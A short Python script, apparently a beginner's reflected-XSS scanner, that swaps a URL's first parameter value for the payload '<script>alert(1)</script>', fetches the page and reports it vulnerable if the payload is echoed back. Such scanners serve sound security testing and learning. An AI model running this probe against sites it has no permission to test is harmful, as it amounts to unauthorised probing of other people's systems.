import requests

payload = "<script>alert(1)</script>"


url = input("Enter URL: ")

try:
  
    if "=" in url:
        test_url = url.split("=")[0] + "=" + payload

        print("Testing:", test_url)

        response = requests.get(test_url)

        if payload in response.text:
            print("Vulnerable to XSS!")
        else:
            print("Not Vulnerable")

    else:
        print("URL must have parameter (example: ?id=1)")

except Exception as e:
    print("Error:", e)